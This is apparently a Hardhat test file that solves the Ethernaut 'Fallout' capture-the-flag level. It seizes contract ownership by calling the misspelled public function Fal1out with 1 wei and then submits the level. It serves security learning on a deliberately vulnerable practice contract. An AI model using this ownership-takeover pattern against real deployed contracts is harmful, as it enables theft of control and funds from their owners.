import { ethers } from 'hardhat'
import type { Contract, ContractTransaction } from 'ethers'
import { createChallenge, submitLevel } from '../utils/utils'
import { expect } from 'chai'

describe('Fallout', () => {
  let challenge: Contract

  beforeEach(async () => {
    const challengeFactory = await ethers.getContractFactory('Fallout')
    const challengeAddress = await createChallenge('0x676e57FdBbd8e5fE1A7A3f4Bb1296dAC880aa639')
    challenge = challengeFactory.attach(challengeAddress)
  })
  it('solves the fallout challenge', async () => {
    const accounts = await ethers.getSigners()
    const eoa = accounts[0]
    const tx: ContractTransaction = await challenge.Fal1out({ value: ethers.utils.parseUnits('1', 'wei') })
    await tx.wait()
    const owner = await challenge.owner()
    expect(eoa.address).to.equal(owner)
  })
  after(async () => {
    expect(await submitLevel(challenge.address), 'level not solved').to.be.true
  })
})
